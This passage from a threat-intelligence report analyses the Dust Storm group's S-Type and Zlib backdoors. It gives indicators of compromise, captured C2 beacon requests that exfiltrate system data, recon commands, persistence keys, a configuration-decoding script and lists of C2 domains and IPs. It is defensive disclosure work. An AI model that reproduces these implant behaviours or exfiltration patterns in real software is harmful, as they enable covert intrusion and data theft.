process).\n\nStarted the malware in a process called msdtc.exe which ran as an orphaned\nNo Yes\nprocess under explorer.exe\n\n\n###### SHA256 File Size Resource Compile Time\n\n\n83399bd0e09b2c2886a58890bbbf6a8d\n32,768 Bytes HLD\n4e6cd3aa32b091045dd6739c637acfd5\n\n\n**Figure 14: Description of Command Line Execution Switches for the Backdoor**\n\nThe backdoor attempted to run a number of tests to determine the privilege level of the compromised user, including whether\nor not a user can be added to the system, whether a directory can be created in the %System% folder, and whether the user can\naccess the service manager via a call to “OpenSCManagerA”.\n\nThe user test was performed by utilizing the NetUserAdd and NetUserDel Windows APIs; the test attempted to create the\ntemporary user “Lost_{Unique Identifier}” with the password “fuck~!@6{Unique Identifier}”. If the secondary network protocol\nwas activated, the backdoor would also execute two commands via the command interpreter to gather system information:\n“cmd.exe /c ipconfig /all” and “cmd.exe /c net user {Username}”. It would temporarily write the output of these commands to\nthe files, “%AppData%\\{Unique Identifier}\\HOSTRURKLSR” and “%AppData%\\{Unique Identifier}\\NEWERSSEMP” respectively.\nThis information was then base64 encoded and transmitted to the C2 server within the URI of a GET request. The S-Type\nnetwork protocol is described in greater detail below. Also of note is that the backdoor would continue to attempt to beacon to\n“smtp.adobekr.com” on port 25 even if communication to the secondary C2 could be established.\n\nThe configuration information contained within these backdoors could be decoded using the same script provided in Figure 8.\n\nFILE CHARACTERISTICS\n\n\n**Figure 16: File Characteristics of the S-Type Backdoor**\n\n###### HOST-BASED INDICATORS Volatile Evidence:\n\n- May create a mutex named “{Unique Identifier}_KB10B2D1_CIlFD2C”\n\n- May create a temporary user on the system named “Lost_{Unique Identifier}” with the password “pond~!@6”{Unique\nIdentifier}”\n\n- May create the folder %System%\\{Unique Identifier} temporarily\n\n###### File System Modifications:\n\n- The backdoor will copy itself to %CommonFiles%\\{Unique Identifier}\\msdtc.exe while other observed variants used\n%Appdata%\\{Unique Identifier}\\msdtc.exe\n\n- May create the file %HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk\n\n  - This shortcut will point to the msdtc.exe file in %CommonFiles% with the “/Start” switch\n\n- May create temporary files in %temp%\\{random numbers}.tmp\n\n###### Registry Modifications:\n\n- Will temporarily create the registry key HKCU\\SOFTWARE\\AdobeSoft\n\n- May create the registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of\nUnique Identifier}\n\n- May create the Registry keys:\n\n - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\ssl.projectscorp.net\\http\n\n - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\ssl.projectscorp.net\\https\n\n###### NETWORK-BASED INDICATORS\nThe backdoor communicated to \"ssl.projectscorp.net\" and \"pic.elecarrow.com\" primarily on port 80; however, communication\nwould also fallback to port 443 or 8080 if initial communication failed. The backdoor used HTTP to communicate with the C2\nservers; data was transmitted base64 encoded in the URI of GET requests or sent in the body of a POST request. It used two\nhardcoded User-Agents, “FirefoxApp” and “Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)” in initial requests, as well\nas the default User-Agent of the system in its later communications.\n\n\n###### SHA256 Network Callbacks Identifier\n\n\nb1aed59dc59a4ef4c7d2b6e67983e4867\ne04ba35c42372eb3b6ad969bd6a6041\n\n93c1c7a666833f5f68d2315dc014dc6c24\n46c91c848130e228e84376b0aaf441\n\n\nPrimary: smtp.adobekr.com\nSecondary: hxxp://mail.glkjcorp.com/index.asp HLD\nTCP Port: 80, 443, 25\n\nPrimary: smtp.adobekr.com\nSecondary: hxxp://auto.glkjcorp.com/us/index.asp GKB\nTCP Port: 80, 443, 25\n\n\n**Figure 15: Secondary C2 Servers and Campaign Identifiers by Sample**\n\n\n-----\n\nExample HTTP requests are presented in the figures below.\n\n\n###### POST hxxp://pic.elecarrow.com:80//Item/2016757.aspx HTTP/1.1 Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1) Host: pic.elecarrow.com:80 Content-Length: 93 Connection: Keep-Alive Cache-Control: no-cache\n\n POST /pic/index.asp HTTP/1.1 Accept: Accept: */*, /pic/index.asp, ssl.projectscorp.net Content-Type: application/x-www-form-urlencoded User-Agent: FirefoxApp Host: ssl.projectscorp.net Content-Length: 354 Cache-Control: no-cache\n\n id=E8C465FC&type=post&stype=info&data=VVNFUi1ENjkyMUY2MjE1fFdpbmRvd- 3MgWFAvQWRtaW5pc3RyYXRvcnwxzOwyM9ChyrE0M7fWfFRaLTEzMTAxM3wNClVTRVIt- RDY5MjFGNjIxNS9BZG1pbmlzdHJhdG9yL0FkbWluaXN0cmF0b3JzDQpDcmVhdGUgVXNl- ciBFcnJvci4gMA0KQ3JlYXRlIERpcmVjdG9yeSBTdWNjZXNzLg0KT3BlblNjTWFuYWdl- ciBPSy4NCkZpbGVTeXN0ZW0gOiBOVEZTDQpObyBBdXRvQ29uZmlnVVJMLg0KTm8gUHJveHlB- ZGRyZXNzLg==\n\n**Figure 17: Initial POST Requests Sent by the S-Type Backdoor**\n\n```\n{Hostname}|Windows XP/{Username}|1??23Сʱ43??|TZ-131013|\n{Hostname}/{Username}/Administrators\n\n###### Create User Error. 0 Create Directory Success. OpenScManager OK. FileSystem : NTFS No AutoConfigURL. No ProxyAddress.\n\n```\n**Figure 19: Decoded Data Parameter from Figure Above**\n\n\n###### GET /pic/index.asp?id=E8C465FC&type=ie&stype=info&data=VVNFUi1ENjkyMUY2M- jE1fFdpbmRvd3MgWFAvQWRtaW5pc3RyYXRvcnwxzOwyM9ChyrE0M7fWfFRaLTEzMTAxM3wNClVTR- VItRDY5MjFGNjIxNS9BZG1pbmlzdHJhdG9yL0FkbWluaXN0cmF0b3JzDQpDcmVhdGUgVXN- lciBFcnJvci4gMA0KQ3JlYXRlIERpcmVjdG9yeSBTdWNjZXNzLg0KT3BlblNjTWFuYWdlciBPSy4N- CkZpbGVTeXN0ZW0gOiBOVEZTDQpObyBBdXRvQ29uZmlnVVJMLg0KTm8gUHJveHlBZGRyZXNzLg== HTTP/1.1 Accept: */* Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322) Accept-Encoding: gzip, deflate Host: ssl.projectscorp.net Connection: Keep-Alive\n\n GET /pic/index.asp?mmid=E8C465FC HTTP/1.1 Accept: */* Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322) Accept-Encoding: gzip, deflate Host: ssl.projectscorp.net Connection: Keep-Alive\n\n**Figure 18: Sample Get Requests Sent by the S-Type Backdoor**\n\n\nThe backdoor attempts to run a number of tests to determine the privilege level of the compromised user, including\nwhether or not a user can be added to the system, whether a directory can be created in the %System% folder, and whether\nthe user can access the service manager. This information is transmitted along with the type of file system and any proxy\ninformation necessary to access the Internet. The backdoor may also make network requests with the following variables\nin the URI “&type=ie&”, “stype=info&data=”, “stype=srv&data=”, “stype=con&data=”, “stype=user&data=”, “mmid=”,\n“&type=post&stype=”, or “&status=”.\n\n###### DETAILS\nIn a similar way as previous Dust Storm backdoors, this one attempted to detect whether or not the victim was using a Japanese\nkeyboard via the “GetKeyboardType” API. The backdoor itself provided the attacker the ability to execute shell commands,\nenumerate system and network information, manipulate files, and download and execute an arbitrary file. Initial observations\nsuggest this was largely a reconnaissance platform that would then be upgraded by the attacker to a full-featured backdoor.\n\nThe backdoor performed the initial tests described above by first attempting to add the user “Lost_{Unique Identifier}” with\nthe password “pond~!@ {Unique Identifier}” to the system using the NetUserAdd API; if successful, it then removed this\nuser via the NetUserDel API. The backdoor then attempted to create the folder “%System%\\{Unique Identifier}” with the\nCreateDirectoryA API and removed it using the RemoveDirectoryA API. Once these two tests were complete, it attempted to\naccess the Windows Service Control Manager through a call to “OpenSCManagerA”. Once it communicated this information\nalong with proxy and file system info via the initial POST requests, the backdoor attempted to execute a sequence of commands\nto enumerate information about the system and local network.\n\n\n###### “net start” “Ipconfig /all” “net user” or “net user /domain” depending on the value of %USERDNSDOMAIN%\n\n**Figure 20: Initial Commands Executed on the System by the Backdoor**\n\n\nThe results of these commands are transmitted base64 encoded as the data parameter within the URI, “/pic/index.\nasp?id={Unique_Identifier}&type=ie&stype=info&data=”. Once the results of these commands are transmitted back to the\nC2 server, the backdoor will continue to beacon to the URI “/pic/index.asp?mmid={Unique Identifier}” and wait for either\ncommands to execute or an updated binary to download and execute. Any file downloaded from the C2 is sent base64 encoded\nand has the name “{Unique Identifier}.txt”. If the file is a binary, it is written to disk as “tmp.exe” and executed via WinExec. The\nbackdoor will then communicate back to the C2 with either “&status=run succeed” if successful, or “&status=Error Code” if\nthere was an error.\n\nThe \"{Unique Identifier}\" referenced above is an eight-character hex-string calculated by adding the volume serial number of\nthe C drive (or D drive if there is no C) and a CRC32 hash of the first 0x90 bytes of the encoded configuration for the backdoor.\nThis was quite different from the earlier Misdat variants, as it can be reversed to yield the serial number of the drive. The\nbackdoor decodes its configuration information from offset 0xE9FC. It skips the first 4 bytes, then subtracts 0x2 from each\nbyte and XOR’s the resultant values with the first byte of the configuration block, 0x58 in this case.\n\n\n-----\n\n###### 0000E9F0                     58 2C 74 14       X,t. 0000EA00  73 32 2E 2E 2A 64 79 79 2D 2D 36 78 2A 2C 39 34  s2..*dyy--6x*,94 0000EA10  3F 3D 2E 2D 3D 39 2C 2A 78 38 3F 2E 79 2A 33 3D  ?=.-=9,*x8?.y*3= 0000EA20  79 33 38 3E 3F 22 78 3B 2D 2A 5A 5A 5A 5A 5A 5A  y38>?”x;-*ZZZZZZ 0000EA30  5A 5A 5A 5A 4B 2A 33 3D 78 3F 36 3F 3D 3B 2C 2C  ZZZZK*3=x?6?=;,, 0000EA40  39 31 78 3D 39 37 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A  91x=97ZZZZZZZZZZ 0000EA50  5A 5A 5A 5A 0A 5A E5 5B CA 49 5A 5A 5A 5A 5A 5A  ZZZZ.Zå[ÊIZZZZZZ 0000EA60  5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A  ZZZZZZZZZZZZZZZZ 0000EA70  5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A  ZZZZZZZZZZZZZZZZ 0000EA80  5A 5A 5A 5A 43 4F D3 5A 5A 5A 5A 5A 5A 5A 5A 5A  ZZZZCOÓZZZZZZZZZ\n\n**Figure 21: Encoded Configuration Block**\n\n\n###### 0000EA00  29 68 74 74 70 3A 2F 2F 73 73 6C 2E 70 72 6F 6A )hxxp://ssl.proj 0000EA10  65 63 74 73 63 6F 72 70 2E 6E 65 74 2F 70 69 63 ectscorp.net/pic 0000EA20  2F 69 6E 64 65 78 2E 61 73 70 00 00 00 00 00 00 /index.asp...... 0000EA30  00 00 00 00 11 70 69 63 2E 65 6C 65 63 61 72 72 .....pic.elecarr 0000EA40  6F 77 2E 63 6F 6D 00 00 00 00 50 00 BB 01 90 1F 00 00 00 00 00 00 ow.com.......... 0000EA50  00 00 00 00 50 00 BB 01 90 1F 00 00 00 00 00 00 ....P.».�....... 0000EA60  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0000EA70  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0000EA80  00 00 00 00 19 15 89 00 00 00 00 00 00 00 00 00 ......‰.........\n\n**Figure 22: Decoded Configuration Block**\n\n\n###### ZLIB BACKDOOR (2014-2015)\nThis backdoor was the preferred second-stage implant for the group throughout 2014 and 2015. The malware was a fullfeatured backdoor with built-in NTLM proxy authentication support which was designed to be run as a ServiceDLL. Each\nsample SPEAR identified was customized to the specific victim environment and programmed using Microsoft Visual C++ 6.\nAs a result, our team has included hashes of samples that were modified to redact victim information. SPEAR has provided as\nmuch information as possible so other victims can identify incidents.\n\nFILE CHARACTERISTICS\n\n###### Modified SHA256 File Size Compile Time\n\n73bc9650ab7871340ef1a6f68dfa71a650\n143,872 Bytes 1/23/2015 3:22:25 UTC\n2b9d9bee85181666da17a63a74178a\n\n8cf3152169f3d7e05734b6b562752a0\n136,702 Bytes 1/05/2015 01:14:50 UTC\n0d566c4ea830c455ea094fa19dec4423c\n\nbbc6d1b87352c3ae109b2c6c97baaf75\n134,144 Bytes 1/16/2015 3:21:31 UTC\n6b66378b6af8dbd7387229d04fc0b14\n\nb4405f0caff1b786612aabbaa7431993f\n108,032 Bytes 1/23/2015 3:23:06 UTC\n44c83a2c8f8c0946a980da9c0c09156\n\n85b80ed2aa871257f293a074d80eb64a\n113,664 Bytes 1/05/2015 01:18:15 UTC\n621ec74ec70c0cf1703f5f5adab23a67\n\n\nText strings in the decoded block are each prefaced by their length in hex. In addition to the URL “hxxp://ssl.projectscorp.net/\npic/index.asp” and the domain “pic.elecarrow.com”, the ports that attempt to beacon on 80, 443, and 8080 are highlighted in\ngreen, blue, and purple respectively. The following Python function can be used to decode these configuration blocks.\n\n\n**Figure 24: Shareable File Characteristics**\n\nAdditional File Details:\n\n- Exports the functions DriverDev, DriverInit, DriverLaunch, DriverProc\n\n- Mimics the resource version information of a legitimate Realtek Semiconductor Module, or Nvidia Module,\nor Synaptics module\n\n- PE checksum of zero\n\n###### HOST-BASED INDICATORS File System Modifications:\n\n- All observed backdoor locations:\n\n  - %WINDIR%\\system32\\cryptpol.dll\n\n  - All Users %AppData%\\cryptpol.dll\n\n  - All Users %AppData%\\wdd.ocx\n\n  - All Users %AppData%\\athmgmt.dll\n\n  - All Users %AppData%\\rasctl.dll\n\n  - All Users %AppData%\\rtcomdll.dll\n\n  - All Users %AppData%\\msnt.dll\n\n- May create randomly named temporary files in %AppData% ending in .tmp\n\n- May create temporary files in the %temp% directory that begin with the letters “tmp”\n\n###### Registry Modifications:\n\n- Will create all necessary keys to configure the backdoor to run as a ServiceDLL, including redefining ServiceMain\nto point to another of the backdoor’s exported functions - all observed service names are below:\n\n  - CryptPol – Cryptography Policy Control Service\n\n  - AtherosMgMt – Atheros Communications Management Service\n\n  - WDDSVC – Windows Display Driver\n\n  - RASCtrl – Remote Access Control Center\n\n\n###### def sub_single_byte_xor(buf,subb, key):   out = ‘’   for i in buf:     out += chr((ord(i)-subb) ^ key)\n```\n  return out\n sub_single_byte_xor(buf,0x2,0x58)\n\n```\n**Figure 23: Python Script to Decode w-Type Configuration Data**\n\n\n-----\n\n###### NETWORK-BASED INDICATORS\nThe backdoor communicates to the preconfigured C2 servers via HTTP POST and GET requests. The contents of the\ncommunications are compressed using the standard Zlib compression library (http://www.zlib.net/). During SPEAR’s limited\ntesting, the User-Agent was always static and set to “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)”.\n\n\n###### 00000320  FF FF FF FF 61 F6 90 7C 4E 6A DD 77 87 6A DD 77  ÿÿÿÿaö�|NjÝw‡jÝw\n\n 00000336  D4 B2 B8 00 03 00 00 80 FC 00 00 00 18 00 00 00  Ô²¸....€ü....... 00000352  FC 00 00 00 8C B2 B8 00 40 00 00 00 00 00 00 00  ü...Œ²¸.@....... 00000368  00 00 00 00 8A 00 8A 00 D4 B2 B8 00 88 B2 B8 00  ....Š.Š.Ô²¸.ˆ²¸. 00000384  00 00 00 00 18 B2 B8 00 84 B2 B8 00 DC FF B8 00  .....²¸.„²¸.Üÿ¸.\n\n 00000400  78 17 DF 77 90 6A DD 77 FF FF FF FF 87 6A DD 77  x.ßw�jÝwÿÿÿÿ‡jÝw\n\n 00000416  95 6B DD 77 13 BD 00 00 A8 B2 B8 00 8B 70 DD 77  •kÝw.½..¨²¸.‹pÝw 00000432  00 01 00 00 9C B2 B8 00 C0 B2 B8 00 D4 BA B8 00  ....œ²¸.À²¸.Ôº¸. 00000448  B8 B2 B8 00 B0 B2 B8 00 00 08 00 00 72 00 00 00  ¸²¸.°²¸.....r...\n\n 00000464  00 00 00 00 1A 00 1C 00 FA CF 90 7C 03 6C DD 77  ........úÏ�|.lÝw 00000480  00 01 00 00 00 00 00 00 BC B2 B8 00 AB 6C DD 77  ........¼²¸.«lÝw 00000496  C4 B2 B8 00 A8 CD B8 00 7A DD 00 10 00 00 00 00  Ä²¸.¨Í¸.zÝ...... 00000512  58 FC B3 00 70 50 02 10 00 00 00 00 53 00 2D 00  Xü³.pP......S.-. 00000528  31 00 2D 00 35 00 2D 00 31 00 38 00 89 5D 95 10  1.-.5.-.1.8.‰]•. 00000544  1C 01 00 00 05 00 00 00 01 00 00 00 28 0A 00 00  ............(... 00000560  02 00 00 00 53 00 65 00 72 00 76 00 69 00 63 00  ....S.e.r.v.i.c. 00000576  65 00 20 00 50 00 61 00 63 00 6B 00 20 00 33 00  e. .P.a.c.k. .3. 00000592  00 00 5C 00 43 00 75 00 72 00 72 00 65 00 6E 00  ..\\.C.u.r.r.e.n.\n\n 00000608  74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00  t.V.e.r.s.i.o.n. 00000624  5C 00 49 00 6E 00 74 00 65 00 72 00 6E 00 65 00  \\.I.n.t.e.r.n.e. 00000640  74 00 20 00 53 00 65 00 74 00 74 00 69 00 6E 00  t. .S.e.t.t.i.n. 00000656  67 00 73 00 00 00 00 00 00 00 00 00 00 00 00 00  g.s............. ---Truncated--- 00000816  00 00 00 00 03 00 00 00 00 01 01 00 00 00 00 00  ................ 00000832  53 00 59 00 53 00 54 00 45 00 4D 00 00 00 00 00  S.Y.S.T.E.M..... --Truncated--- 00001264  00 00 00 00 00 00 00 00 00 00 00 00 E0 B5 B8 00  ............àµ¸. 00001280  99 51 91 7C 08 B6 B8 00 E4 00 08 00 04 00 00 00  ™Q‘|.¶¸.ä....... 00001296  D4 00 08 00 00 00 08 00 20 B6 B8 00 8B 53 91 7C  Ô....... ¶¸.‹S‘| 00001312  08 B6 B8 00 D4 00 08 00 00 00 00 00 10 00 00 00  .¶¸.Ô...........\n\n 00001328  00 00 00 00 A4 B6 B8 00 7A CF 90 7C 7B 8B 91 7C  ....¤¶¸.zÏ�|{‹‘|\n\n 00001344  FF FF FF FF 40 B6 B8 00 01 00 00 00 D7 07 00 00  ÿÿÿÿ@¶¸.....×...\n\n**Figure 26: Decompressed Contents of Initial POST Request**\n\n\n###### POST /EKTV/index.php?id=0 HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: bcsr.wordoscorp.com Accept: */* Cache-Control: no-cache Connection: Keep-Alive Content-Length: 498\n\n POST /EKTV/index.php?id=3580792616 HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: bcsr.wordoscorp.com Accept: */* Cache-Control: no-cache Connection: Keep-Alive Content-Length: 490\n\n**Figure 25: Initial POST Requests Sent by the Zlib Backdoor**\n\n\n###### 00000000 1C 12 00 00 1E 12 00 00 FF FF FF FF 40 05 00 00  ........ÿÿÿÿ@... 00000016 FE CD 18 9C 55 00 53 00 45 00 52 00 2D 00 44 00  þÍ.œU.S.E.R.-.D. 00000032 36 00 39 00 32 00 31 00 46 00 36 00 32 00 31 00  6.9.2.1.F.6.2.1. 00000048 35 00 00 00 DA D2 90 7C DC FF B8 00 20 E9 90 7C  5...ÚÒ�|Üÿ¸. é�|\n\n 00000064 68 F6 90 7C FF FF FF FF 61 F6 90 7C EE D4 DD 77  hö�|ÿÿÿÿaö�|îÔÝw\n\n 00000080 00 00 00 00 E0 CC B8 00 00 00 00 00 F9 D4 DD 77  ....àÌ¸.....ùÔÝw 00000096 00 00 00 00 00 00 00 00 FC 00 00 00 00 00 00 00  ........ü....... 00000112 20 00 00 00 00 00 00 00 9E 7E E5 14 52 55 D1 01  .......ž~å.RUÑ. 00000128 00 00 00 00 10 00 00 00 53 00 2D 00 31 00 2D 00  ........S.-.1.-.\n\n 00000144 35 00 2D 00 9C B2 B8 00 6E D9 90 7C DC B1 B8 00  5.-.œ²¸.nÙ�|Ü±¸.\n\n 00000160 98 B1 B8 00 5C F6 90 7C 61 F6 90 7C DC B1 B8 00  ˜±¸.\\ö�|aö�|Ü±¸.\n\n 00000176 6E D9 90 7C 9C B2 B8 00 74 B1 B8 00 7A D9 90 7C  nÙ�|œ²¸.t±¸.zÙ�|\n\n 00000192 DC FF B8 00 20 E9 90 7C 68 F6 90 7C FF FF FF FF  Üÿ¸. é�|hö�|ÿÿÿÿ\n\n 00000208 61 F6 90 7C EB 6F DD 77 34 00 00 C0 00 00 00 00  aö�|ëoÝw4..À....\n\n 00000224 D4 BA B8 00 F6 6F DD 77 C0 B2 B8 00 00 01 00 00  Ôº¸.öoÝwÀ²¸..... 00000240 B8 B2 B8 00 B0 B2 B8 00 00 01 00 00 D4 BA B8 00  ¸²¸.°²¸.....Ôº¸. 00000256 DC B1 B8 00 00 00 00 00 00 00 00 00 00 00 00 00  Ü±¸.............\n\n 00000272 34 00 00 C0 0C B2 B8 00 5C F6 90 7C 61 F6 90 7C  4..À.²¸.\\ö�|aö�|\n\n 00000288 00 00 00 00 8C B2 B8 00 2D F6 90 7C E8 B1 B8 00  ....Œ²¸.-ö�|è±¸.\n\n 00000304 EC B1 B8 00 54 B2 B8 00 20 E9 90 7C 68 F6 90 7C  ì±¸.T²¸. é�|hö�|\n\n\n(con’t)\n\n\nThe hostname, context the backdoor was running under, operating system information, and user information were transmitted\nback to the C2 during a controlled test.\n\n###### DETAILS\nAnecdotal evidence suggests the attackers made few modifications to the backdoors themselves and instead simply updated\nthe configuration information as needed. As a result, most of the backdoors identified had a PE checksum mismatch between\nthe stated value and calculated value. The backdoor provided the attacker with the ability to upload and download files,\nenumerate files and drives, enumerate system information, enumerate and manipulate Windows services, enumerate and\nimpersonate logon sessions, mimic keystrokes and mouse input, capture screenshots, and execute shell commands.\n\nThe backdoor itself contained very few unique plain-text strings or any other type of identifying information outside of the\nImport Table. The backdoor would initialize strings of interest on the stack by pushing one character at a time; this method\nhas become increasingly common among malware authors to avoid antivirus heuristic methods. The backdoor’s configuration\ninformation was stored Zlib compressed within the binary with the size of the compressed data saved as a double word right\nbefore the start of the header “0x78 0x9C”. The decompressed data contained the Windows service name, Windows display\n\n\n-----\n\nname, and a description for the service. It also contained the filename the backdoor would use, the domain names and ports\nto beacon on, and the internal corporate proxy to use.\n\n\n###### APPENDIX\n\nComplete Infrastructure - All Currently Known Domains and Subdomains:\n\n\nkj.uuvod.net\nkrgt.tomshardpc.com\nlhbf.adobeus.com\nlogin.adobekr.com\nlogin.live.adobekr.com\nlogin.live.wih365.com\nlogin.wih365.com\nmail.adobekr.com\nmail.glkjcorp.com\nmail.projectscorp.net\nmailxss.9966.org\nmesdata.8866.org\nmicrobing.oicp.net\nmicroses.9966.org\nmicroupdate.8800.org\nmicrowmies.oicp.net\nmobile.yqby.wordoscorp.com\nmocrosoftds.xicp.net\nmodeless.3322.org\nmovie.sfcorporation.com\nmoviestops.com\nmsejake.7766.org\nmsevpn.3322.org\nmusic.sfcorporation.com\nnet.amazonwikis.com\nnews.amazonwikis.com\nnews.elecarrow.com\nnews.sfcorporation.com\nnttvps.gnway.net\npic.elecarrow.com\npic.glkjcorp.com\npic.hkabinc.com\npics.adobeus.com\npics.amazonwikis.com\nprojectscorp.net\nqsgs.sfcorporation.com\nrbjg.moviestops.com\nrbjg.moviestops.com\nrbny.sfcorporation.com\nrbxr.tomshardpc.com\nrjby.tomshardpc.com\nrjjh.wordoscorp.com\nrmax.amazonwikis.com\nruag.amazonwikis.com\nsane.adobeus.com\nsdj2b.3322.org\nsfcorporation.com\nsgad.sfcorporation.com\nshowjiao.imzone.in\nshowshow.7766.org\nsmgs.amazonwikis.com\nsmtp.adobekr.com\nsport.sfcorporation.com\nssl.elecarrow.com\nssl.exemail.net\nssl.gmnspace.com\nssl.projectscorp.net\nssl.sfcorporation.com\nsslmails.com\nsybf.adobeus.com\ntcgs.adobeus.com\ntdfg.moviestops.com\n\n\ntech.amazonwikis.com\ntest.uuvod.net\ntomshardpc.com\ntqsj.sfcorporation.com\ntzcl.sfcorporation.com\ntzz.exemail.net\nup.adobekr.com\nupdate.adobekr.com\nupdate.adobeus.com\nuworks.sfcorporation.com\nv.exemail.net\nvideo.sfcorporation.com\nvod.amazonwikis.com\nvod.sfcorporation.com\nvpntemp.3322.org\nwbjs.sfcorporation.com\nweb.sfcorporation.com\nwed.amazonwikis.com\nwih365.com\nwordoscorp.com\nwsxg.moviestops.com\nwww.adobeus.com\nwww.projectscorp.net\nwww.wih365.com\nwxpb.sfcorporation.com\nxjgs.sfcorporation.com\nxkgs.sfcorporation.com\nxrgt.tomshardpc.com\nxrgt.wordoscorp.com\nyahoo.gmnspace.com\nyahoomail.adobeus.com\nygfk.sfcorporation.com\nyhkj.sfcorporation.com\nyjbf.amazonwikis.com\nyjxy.sfcorporation.com\nyqby.wordoscorp.com\nzdzl.sfcorporation.com\nziper.imbbs.in\nzpgx.tomshardpc.com\n\nAll Known IP\nAddresses:\n108.171.240.154\n111.67.199.213\n111.67.199.222\n112.175.69.60\n112.175.69.89\n112.218.71.202\n113.10.139.218\n113.10.168.22\n113.11.202.233\n114.108.150.38\n116.255.131.152\n118.99.37.87\n118.193.163.143\n120.126.134.196\n120.31.68.42\n123.254.111.169\n124.162.53.203\n124.162.53.224\n125.46.42.221\n126.125.35.247\n\n\n126.25.172.171\n126.25.201.73\n173.252.201.210\n175.41.23.181\n203.124.12.24\n203.124.12.59\n210.105.192.3\n210.209.116.105\n210.209.117.148\n210.209.117.235\n210.51.13.167\n211.22.125.58\n211.42.249.37\n218.106.246.177\n218.106.246.189\n218.106.246.195\n218.106.246.220\n218.106.246.222\n218.106.246.254\n218.106.247.81\n23.238.229.128\n27.255.72.68\n27.255.72.69\n27.255.72.78\n59.188.13.133\n59.188.13.137\n\n\n###### 00000000  43 00 72 00 79 00 70 00 74 00 50 00 6F 00 6C 00  C.r.y.p.t.P.o.l. --Truncated--- 00000060  00 00 00 00 43 00 72 00 79 00 70 00 74 00 6F 00  ....C.r.y.p.t.o. 00000070  67 00 72 00 61 00 70 00 68 00 79 00 20 00 50 00  g.r.a.p.h.y. .P. 00000080  6F 00 6C 00 69 00 63 00 79 00 20 00 43 00 6F 00  o.l.i.c.y. .C.o. 00000090  6E 00 74 00 72 00 6F 00 6C 00 20 00 53 00 65 00  n.t.r.o.l. .S.e. 000000A0  72 00 76 00 69 00 63 00 65 00 00 00 00 00 00 00  r.v.i.c.e....... 000000B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ --Truncated--- 00000120  00 00 00 00 00 00 00 00 00 00 00 00 50 00 72 00  ............P.r. 00000130  6F 00 76 00 69 00 64 00 65 00 20 00 74 00 68 00  o.v.i.d.e. .t.h. 00000140  65 00 20 00 70 00 6F 00 6C 00 69 00 63 00 79 00  e. .p.o.l.i.c.y. 00000150  2D 00 62 00 61 00 73 00 65 00 64 00 20 00 62 00  -.b.a.s.e.d. .b. 00000160  61 00 73 00 69 00 63 00 20 00 63 00 72 00 79 00  a.s.i.c. .c.r.y. 00000170  70 00 74 00 6F 00 67 00 72 00 61 00 70 00 68 00  p.t.o.g.r.a.p.h. 00000180  79 00 20 00 73 00 65 00 72 00 76 00 69 00 63 00  y. .s.e.r.v.i.c. 00000190  65 00 2E 00 49 00 66 00 20 00 74 00 68 00 69 00  e...I.f. .t.h.i. 000001A0  73 00 20 00 73 00 65 00 72 00 76 00 69 00 63 00  s. .s.e.r.v.i.c. 000001B0  65 00 20 00 69 00 73 00 20 00 73 00 74 00 6F 00  e. .i.s. .s.t.o. 000001C0  70 00 70 00 65 00 64 00 2C 00 20 00 74 00 68 00  p.p.e.d.,. .t.h. 000001D0  65 00 20 00 63 00 72 00 79 00 70 00 74 00 6F 00  e. .c.r.y.p.t.o. 000001E0  67 00 72 00 61 00 70 00 68 00 79 00 20 00 70 00  g.r.a.p.h.y. .p. 000001F0  6F 00 6C 00 69 00 63 00 79 00 20 00 63 00 6F 00  o.l.i.c.y. .c.o. 00000200  6E 00 74 00 72 00 6F 00 6C 00 20 00 73 00 65 00  n.t.r.o.l. .s.e. 00000210  72 00 76 00 69 00 63 00 65 00 20 00 77 00 69 00  r.v.i.c.e. .w.i. 00000220  6C 00 6C 00 20 00 6E 00 6F 00 74 00 20 00 66 00  l.l. .n.o.t. .f. 00000230  75 00 6E 00 63 00 74 00 69 00 6F 00 6E 00 20 00  u.n.c.t.i.o.n. . 00000240  70 00 72 00 6F 00 70 00 65 00 72 00 6C 00 79 00  p.r.o.p.e.r.l.y. 00000250  2E 00 20 00 00 00 00 00 00 00 00 00 00 00 00 00  .. ............. ---Truncated--- 00000380  00 00 00 00 43 00 72 00 79 00 70 00 74 00 50 00  ....C.r.y.p.t.P. 00000390  6F 00 6C 00 2E 00 64 00 6C 00 6C 00 00 00 00 00  o.l...d.l.l..... ---Truncated--- 00000580  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 00000590  62 63 73 72 2E 77 6F 72 64 6F 73 63 6F 72 70 2E  bcsr.wordoscorp. 000005A0  63 6F 6D 00 00 00 00 00 00 00 00 00 00 00 00 00  com............. ---Truncated--- 00000680  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 73  ...............s 00000690  50 00 00 00 6A 6E 68 73 2E 74 6F 6D 73 68 61 72  P...jnhs.tomshar 000006A0  64 70 63 2E 63 6F 6D 00 00 00 00 00 00 00 00 00  dpc.com......... 